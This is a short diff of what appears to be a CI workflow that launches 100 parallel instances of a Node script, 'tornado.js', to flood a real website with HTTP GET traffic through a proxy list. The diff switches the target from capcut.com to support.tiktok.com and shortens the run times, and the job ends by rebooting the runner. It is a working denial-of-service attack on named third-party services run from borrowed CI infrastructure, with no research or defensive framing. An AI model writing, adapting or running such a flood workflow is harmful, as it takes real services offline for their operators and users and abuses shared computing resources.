@@ -21,7 +21,7 @@ jobs:
           chmod +x tornado.js
           PIDS=()
           for i in {1..100}; do
-            timeout 80 node tornado.js GET https://www.capcut.com/ 80 16 90 proxies.txt --full --query 3
+            timeout 70 node tornado.js GET https://support.tiktok.com/en 70 16 64 proxies.txt --full --query 3
             PIDS+=($!)
           done
           
@@ -30,7 +30,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 80
+        run: sleep 70
         
       - name: OK !
         run: sudo reboot
